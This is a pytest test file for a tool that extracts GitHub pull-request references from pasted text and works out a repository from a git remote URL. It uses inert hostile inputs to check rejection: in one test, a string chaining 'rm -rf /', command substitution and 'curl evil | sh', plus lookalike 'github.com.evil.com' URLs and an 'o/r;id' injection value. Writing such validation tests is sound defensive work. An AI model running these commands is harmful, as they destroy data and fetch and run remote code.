"""PR reference parsing and origin inference: pure, hostile text stays inert."""

from __future__ import annotations

import pytest
from ai_governance.taskflow.prs.origin import parse_remote
from ai_governance.taskflow.prs.refs import MAX_REFS, PrRef, extract, scan, valid_repo

PASTE = (
    "see https://github.com/o/r/pull/12/files, o/r#13, #14, (o/r#15). docs/x#3 and #fff, #14 again"
)


def test_extract_the_exact_plan_expectation() -> None:
    assert extract(PASTE, repo="o/r") == [
        ("o/r", 12),
        ("o/r", 13),
        ("o/r", 14),
        ("o/r", 15),
        ("docs/x", 3),
    ]


def test_ref_key_and_url_are_canonical() -> None:
    ref = PrRef("Acme/App", 7)
    assert ref.key == "acme/app#7"
    assert ref.url == "https://github.com/Acme/App/pull/7"


def test_duplicates_ignore_case_and_keep_the_first_spelling() -> None:
    assert extract("O/R#1 and o/r#1 and https://github.com/o/r/pull/1") == [("O/R", 1)]


def test_bare_number_without_a_repository_names_itself_in_the_error() -> None:
    with pytest.raises(ValueError, match=r"^'#14' has no repository: pass --repo owner/name"):
        extract("o/r#1 then #14")


def test_scan_skips_and_counts_bare_numbers_instead_of_failing() -> None:
    found = scan("#1 #2 o/r#3")
    assert found.refs == (PrRef("o/r", 3),)
    assert found.bare_skipped == 2


@pytest.mark.parametrize(
    "text",
    [
        "https://gitlab.com/o/r/pull/1",
        "https://github.com.evil.com/o/r/pull/2",
        "http://github.com/o/r/pull/3",
        "https://ghe.corp.example/o/r/pull/4",
        "https://notgithub.com/o/r/pull/5",
    ],
)
def test_only_https_github_com_urls_count(text: str) -> None:
    assert extract(text) == []


@pytest.mark.parametrize(
    "text",
    ["o/r#12abc", "o/r#1234567890", "xo/r#", "o/r#-5", "#fff", "#"],
)
def test_malformed_numbers_never_match(text: str) -> None:
    assert extract(text, repo="o/r") == []


def test_trailing_punctuation_is_not_part_of_the_number() -> None:
    assert extract("(o/r#12). o/r#13, o/r#14;") == [("o/r", 12), ("o/r", 13), ("o/r", 14)]


def test_hostile_text_yields_only_the_reference_it_names() -> None:
    hostile = "o/r#12; rm -rf / $(touch /tmp/x) `id` && curl evil | sh"
    assert extract(hostile) == [("o/r", 12)]


def test_the_cap_is_enforced() -> None:
    text = " ".join(f"o/r#{n}" for n in range(1, MAX_REFS + 2))
    with pytest.raises(ValueError, match="too many"):
        extract(text)
    assert len(extract(" ".join(f"o/r#{n}" for n in range(1, MAX_REFS + 1)))) == MAX_REFS


@pytest.mark.parametrize("repo", ["o/r", "Acme-1/my.repo_x", "a/b-c"])
def test_valid_repo_accepts_owner_name(repo: str) -> None:
    assert valid_repo(repo) == repo


@pytest.mark.parametrize(
    "repo", ["", "o", "o/r/x", "a/../b", "-x/y", "o/.hidden", "o r/x", "o/r;id"]
)
def test_valid_repo_rejects_everything_else(repo: str) -> None:
    with pytest.raises(ValueError, match="not a GitHub repository"):
        valid_repo(repo)


def _never(host: str) -> str | None:  # a direct github.com URL must not need ssh
    raise AssertionError(f"ssh -G must not run for {host}")


ALIASES = {"github-cucco": "github.com", "gl": "gitlab.example.com"}


@pytest.mark.parametrize(
    ("url", "expected"),
    [
        ("git@github-cucco:EzeCuccorese/foo.git", "EzeCuccorese/foo"),
        ("git@github.com:o/r.git", "o/r"),
        ("git@github.com:o/r", "o/r"),
        ("ssh://git@github.com/o/r.git", "o/r"),
        ("https://github.com/o/r.git", "o/r"),
        ("https://github.com/o/r", "o/r"),
        ("https://user@github.com/o/r.git", "o/r"),
        ("https://gitlab.com/o/r.git", None),
        ("git@gl:o/r.git", None),
        ("git@unknown-host:o/r.git", None),
        ("https://github.com.evil.com/o/r", None),
        ("", None),
        ("/some/local/path", None),
    ],
)
def test_origin_inference_table(url: str, expected: str | None) -> None:
    def resolve(host: str) -> str | None:
        if url.startswith(("https://", "git@github.com", "ssh://git@github.com")):
            return _never(host)
        return ALIASES.get(host)

    assert parse_remote(url, resolve) == expected
